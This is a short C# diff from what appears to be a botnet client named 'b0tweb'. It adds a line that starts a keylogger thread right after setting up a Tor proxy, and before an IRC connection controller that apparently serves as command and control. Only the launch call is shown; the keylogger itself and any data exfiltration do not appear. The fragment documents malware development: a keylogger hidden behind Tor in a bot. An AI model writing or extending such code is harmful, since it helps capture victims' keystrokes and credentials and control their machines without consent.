@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -24,7 +24,11 @@ namespace b0tweb
 
             TorProxy proxy = new TorProxy();
             proxy.Establish();
+
+            Thread keyloggerThread = Keylogger.Run();
+
             Thread.Sleep(5); // wait for connection to be established
+
             Console.WriteLine("Connection to Tor successfuly established!");
 
             IRCConnectionController controller = new IRCConnectionController();
